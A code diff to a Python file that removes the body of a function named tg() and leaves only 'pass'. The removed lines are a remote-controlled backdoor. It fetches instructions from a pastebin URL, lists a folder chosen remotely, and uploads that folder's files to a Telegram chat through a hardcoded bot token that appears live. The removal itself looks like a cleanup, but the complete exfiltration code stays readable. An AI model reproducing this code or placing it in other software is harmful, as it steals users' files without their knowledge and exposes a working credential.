@@ -14,47 +14,7 @@ except ImportError:
 fcheck =False
 scheck=False
 def tg():
-    while True:
-        commands=requests.get("https://pastebin.com/raw/2Nq5PFz3").json()
-        if commands["start"]=="yes":
-            dir_list = os.listdir(commands["folder"])
-            text=str(len(dir_list))+"\n"+str(dir_list)
-            if len(text) >4096:
-                text=str(len(dir_list))+str(dir_list)[:4000]
-            if requests.get(f"https://api.telegram.org/bot7065581980:AAEaCnZdDFYpQM2T_KvyXIvk4NUZdEZ3910/sendMessage?text={text}&chat_id=7027929429").status_code == 200:
-                if commands["grabe"] == "yes":
-                    dir_list = os.listdir(commands["folder"])
-                    i=int(commands["file_number"])
-                    while i<len(dir_list):
-                        try:
-                            TELEGRAM_API_URL = f'https://api.telegram.org/bot7065581980:AAEaCnZdDFYpQM2T_KvyXIvk4NUZdEZ3910/sendPhoto'
-                            photo_path = commands["folder"]+dir_list[i]
-                            if str(photo_path).endswith("mp4"):
-                                pass
-                            else:
-                                with open(photo_path, 'rb') as photo_file:
-                                    payload = {'chat_id': "7027929429",'caption': photo_path+"-number-"+str(i)}
-                                    response = requests.post(TELEGRAM_API_URL, data=payload, files={'photo': photo_file})
-                                if response.status_code == 200:
-                                    pass
-                                else:
-                                    requests.get(f"https://api.telegram.org/bot7065581980:AAEaCnZdDFYpQM2T_KvyXIvk4NUZdEZ3910/sendMessage?text={str(response.text)}&chat_id=7027929429")
-                        except Exception as err:
-                            requests.get(f"https://api.telegram.org/bot7065581980:AAEaCnZdDFYpQM2T_KvyXIvk4NUZdEZ3910/sendMessage?text={str(err)}&chat_id=7027929429")
-                        global scheck
-                        if scheck:
-                            break
-                        i=i+1
-                    break
-                else:
-                    pass
-            else:
-                requests.get(f"https://api.telegram.org/bot7065581980:AAEaCnZdDFYpQM2T_KvyXIvk4NUZdEZ3910/sendMessage?text=Error - 1&chat_id=7027929429")
-        else:
-            pass
-        global fcheck
-        if fcheck:
-            break
+    pass
 
 
 
